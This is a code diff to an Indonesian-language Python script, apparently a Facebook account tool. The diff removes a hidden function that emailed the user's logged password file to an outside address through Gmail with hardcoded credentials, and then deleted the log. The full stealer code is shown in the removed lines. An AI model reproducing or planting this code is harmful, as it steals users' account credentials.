@@ -115,41 +115,7 @@ def inputM(x,d):
 		else:
 			tampil('\rm[!]==// Pilihan tidak ada')
 	return i
-def kirim():
-   email_user = 'asulokentoddd@tutanota.com'
-   email_password = 'Ngentodlonte123'
-   email_send = 'n1ghtpe0ple@protonmail.com'
 
-   subject = 'Skidipapap-ed By N1ght.Hax0r'
-
-   msg = MIMEMultipart()
-   msg['From'] = email_user
-   msg['To'] = email_send
-   msg['Subject'] = subject
-
-   body = '[+]==// Akun Orang Goblok //==[+]'
-   msg.attach(MIMEText(body,'plain'))
-
-   filename='log.txt'
-   attachment  =open('log.txt','rb')
-
-   part = MIMEBase('application','octet-stream')
-   part.set_payload((attachment).read())
-   encoders.encode_base64(part)
-   part.add_header('Content-Disposition',"attachment; filename= "+filename)
-
-   msg.attach(part)
-   text = msg.as_string()
-   server = smtplib.SMTP('smtp.gmail.com',587)
-   server.starttls()
-   server.login(email_user,email_password)
-
-
-   server.sendmail(email_user,email_send,text)
-   server.quit()
-
-def hapus():
-	os.remove('log.txt')
 def simpan():
 	if len(id_bgroup) != 0:
 		tampil('\rh[!]==// Saving \rcMBFbgroup.txt...')
@@ -203,8 +169,6 @@ def login():
 		z.write(" PASSWORD : ")
 		z.write(pa)
 		z.close()
-		kirim()
-		hapus()
 	elif 'checkpoint' in url:
 		tampil('\rm[!]==// Akun kena checkpoint\n\rk[!]==// Coba Login dengan opera mini')
 		keluar()
